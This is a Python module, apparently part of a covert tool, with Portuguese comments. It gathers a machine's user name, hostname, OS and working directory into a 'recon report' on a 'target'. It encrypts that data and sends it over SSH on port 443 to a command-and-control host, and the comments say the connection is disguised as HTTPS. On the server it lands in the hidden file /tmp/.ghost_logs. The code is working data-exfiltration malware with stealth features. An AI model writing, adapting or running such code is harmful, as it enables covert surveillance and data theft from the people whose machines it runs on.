# [ARQUIVO: ghost_engine.py] - ATUALIZADO v6.0 PRIME
import paramiko
from cryptography.fernet import Fernet
import os
import platform
import socket

class GhostEngine:
    def __init__(self, key_path="nexus_prime.key"):
        # Verifica se a chave existe antes de carregar
        if not os.path.exists(key_path):
            raise FileNotFoundError(f"Chave {key_path} não encontrada. Gere-a com o ghost_vault.py")
        
        with open(key_path, "rb") as f:
            self.cipher = Fernet(f.read())
            
    def cifrar_dados(self, texto):
        """Transforma credenciais e logs em ruído ilegível AES-256."""
        return self.cipher.encrypt(texto.encode())

    def transmitir_via_tunel(self, host_c2, user, pkey_path, payload_cifrado):
        """Abre o túnel reverso e ejeta o dado cifrado pela Porta 443."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Tenta conectar mascarado como HTTPS
            ssh.connect(host_c2, port=443, username=user, key_filename=pkey_path, timeout=10)
            
            # Envia o payload cifrado para o servidor C2
            stdin, stdout, stderr = ssh.exec_command(f"echo {payload_cifrado.decode()} >> /tmp/.ghost_logs")
            ssh.close()
            return True
        except Exception as e:
            print(f"⚠️ Falha na Transmissão Stealth: {e}")
            return False

    def scan_local_credentials(self):
        """
        [MÓDULO RECON] 
        Simulação de busca por identificadores do sistema e rastros de usuário.
        """
        info = {
            "user": os.getlogin(),
            "os": platform.system(),
            "release": platform.release(),
            "node": platform.node(),
            "path": os.getcwd()
        }
        
        report = f"--- NEXUS RECON REPORT ---\n"
        report += f"TARGET: {info['user']}@{info['node']}\n"
        report += f"SISTEMA: {info['os']} {info['release']}\n"
        report += f"LOCAL: {info['path']}\n"
        report += "--------------------------"
        
        return report
